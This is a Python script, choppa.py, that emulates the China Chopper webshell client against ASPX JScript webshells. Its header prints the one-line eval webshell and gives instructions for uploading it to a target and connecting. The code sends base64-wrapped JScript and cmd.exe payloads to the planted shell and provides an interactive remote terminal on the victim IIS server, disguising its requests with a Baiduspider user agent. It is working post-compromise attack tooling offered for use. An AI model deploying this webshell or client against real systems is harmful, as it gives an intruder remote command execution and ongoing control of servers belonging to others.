#!/usr/bin/python3

'''
-------------------------------------------------------
                    choppa.py - x0ff
-------------------------------------------------------
choppa.py is a python implementation of caidao.exe, which includes minimal implementations
of caidao.exe's features exclusively for ASPX Jscript variants of China Chopper webshells such as:

<script language="JScript" runat="server">function Page_Load(){eval(Request["password"],"unsafe");}</script>

Emulated caidao.exe features include:
- inline Jscript execution
- Virtual terminal emulation with Jscript and cmd.exe /c

choppa.py is not fully featured, and does not include file upload/download or support
for other webshell types referenced in caidao.exe such as ASP and PHP. These features are subject 
to future implementations.

#########################
INSTRUCTIONS:
#########################
1. Change webshell password

<script language="JScript" runat="server">function Page_Load(){eval(Request["Nonqjbexznaoynzrfuvfgbbyf"],"unsafe");}</script>

2. Upload ASPX webshell on target
3. Modify URL to specify target server and webshell name in choppa.py
4. Execute choppa.py with chosen mode number "python3 choppa.py -p Nonqjbexznaoynzrfuvfgbbyf -m 1"
'''

import sys
import requests
import argparse
from base64 import b64encode
import re

# Default User Agent string set by caidao.exe
USER_AGENT = "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html"
headers = { "User-Agent": USER_AGENT }

# URL to China Chopper webshell
# CHANGE IP ADDRESS TO TARGET SERVER
URL = "http://ip_address/index.aspx"



def banner():
    print("")
    print("---------------------------------------------------")
    print("<- China Chopper \"caidao.exe\" Client Emulator -> ")
    print("---------------------------------------------------")
    print("")

def arg_parse():
    parser_obj = argparse.ArgumentParser(description="China Chopper client emulator")
    parser_obj.add_argument('-p','--password',dest='password',type=str,help='Password for URL POST field')
    parser_obj.add_argument('-m','--mode',dest='mode_type',type=int,help='Interactive virtual terminal = [1], Jscript execution = [2]')
    args = parser_obj.parse_args()
    return args


# Jscript execution
# Sample command: Response.Write("Hello JScript.NET!");
def jscript_exec(password):
    jscript_cmd = input("[!] Enter Jscript line to be executed: ")

    b64_cmd = b64encode(jscript_cmd.encode("utf-8")).decode()
    jscript_payload = "Response.Write(\"X@Y\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(\"" + b64_cmd + "\")),\"unsafe\");}catch(err){Response.Write(err.message);}Response.Write(\"X@Y\");Response.End();"

    # Send Jscript command
    resp = requests.post(URL, headers=headers, data={ password:jscript_payload })
    
    
    # Regex to parse command output
    cmd_regex = re.compile(r"X@Y(.*)X@Y", re.DOTALL)

    if resp.status_code == 200:
        try:
            # Debug: print(cmd_regex.findall(resp.text))
            cmd_output = cmd_regex.findall(resp.text)[0]
            print("[!] Output: ")
            print(cmd_output)
        except:
            print("[!] Could not retrieve command output")
    else:
        print("[!] Invalid response status code, password may be incorrect")
    
    print("\n[!] Exiting")


# Virtual terminal emulation
def interactive_terminal(password):

    # Default IIS path
    iis_dir = "C:\\\\inetpub\\\\wwwroot"

    print("[-] Enter 'quit' to exit")
    while True:
        prompt = "[caidao-shell] " + iis_dir.replace('\\\\','\\')
        user_cmd = input(prompt + '>')

        if user_cmd.strip() == "quit":
            print("[!] Exiting")
            sys.exit(0)
        
        # No input or whitespace
        elif len(user_cmd) == 0:
            continue

        else:
            new_path = cmd_exec(user_cmd.strip(), password, iis_dir)
            if new_path != False:
                iis_dir = new_path
            else:
                pass


# Virtual terminal "cmd.exe /c" execution 
def cmd_exec(cmd, password, curr_iis_dir):

    '''
    ---------------------------------------
    Jscript base64-encoded client-side code
    ---------------------------------------
    var c=new System.Diagnostics.ProcessStartInfo('cmd');
    var e=new System.Diagnostics.Process();
    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
    c.UseShellExecute=false;
    c.RedirectStandardOutput=true;
    c.RedirectStandardError=true;
    e.StartInfo=c;
    c.Arguments='/c cd /d  $CURRENT_PATH&$COMMAND&echo [S]&cd&echo [E]';
    e.Start();
    out=e.StandardOutput;
    EI=e.StandardError;
    e.Close();
    Response.Write(out.ReadToEnd()+EI.ReadToEnd());
    '''
    cmd_proc = "var c=new System.Diagnostics.ProcessStartInfo('cmd');var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments='/c cd /d " + curr_iis_dir + "&" + cmd + "&echo [S]&cd&echo [E]';e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd());"
    b64_cmd = b64encode(cmd_proc.encode("utf-8")).decode()


    '''
    ---------------------------------------
    Jscript eval() wrapper
    ---------------------------------------
    Response.Write("X@Y");
    var err:Exception;
    try {  
        eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("$BASE64_JSCRIPT_COMMAND")),"unsafe");
    }
    catch(err) {
        Response.Write("ERROR:// " + err.message);
    }
    Response.Write("X@Y");
    Response.End();"
    '''
    jscript_payload = "Response.Write(\"X@Y\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(\"" + b64_cmd + "\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \" + err.message);}Response.Write(\"X@Y\");Response.End();"


    # Send command with server-side plaintext password as POST parameter
    resp = requests.post(URL, headers=headers, data={password:jscript_payload})


    # Regex to parse command output
    cmd_regex = re.compile(r"X@Y(.*)\[S\]", re.DOTALL)  # re.DOTALL extends regex to mathc multiline strings
    if resp.status_code == 200:
        try:
            # Debug: print(cmd_regex.findall(resp.text))
            cmd_output = cmd_regex.findall(resp.text)[0]
            print(cmd_output)
        except:
            print("[!] Could not retrieve command output")
    else:
        print("[!] Invalid response status code, password may be incorrect")


    # Regex to search for current path
    path_regex = re.compile(r"\[S\](.*)\[E\]", re.DOTALL) 

    try:
        # Debug: print(regex.findall(resp.text))
        current_path = path_regex.findall(resp.text)[0][1:-1].strip('\r\n').replace('\\','\\\\')
        return current_path
    except:
        print("[!] Could not retrieve current path")
        return False



if __name__ == '__main__':
    banner()
    args = arg_parse()
    mode = args.mode_type
    pass_str = args.password

    if mode == 1:
        interactive_terminal(pass_str)
    elif mode == 2:
        jscript_exec(pass_str)
    else:
        print("[!] Invalid mode")
    
    sys.exit(0)
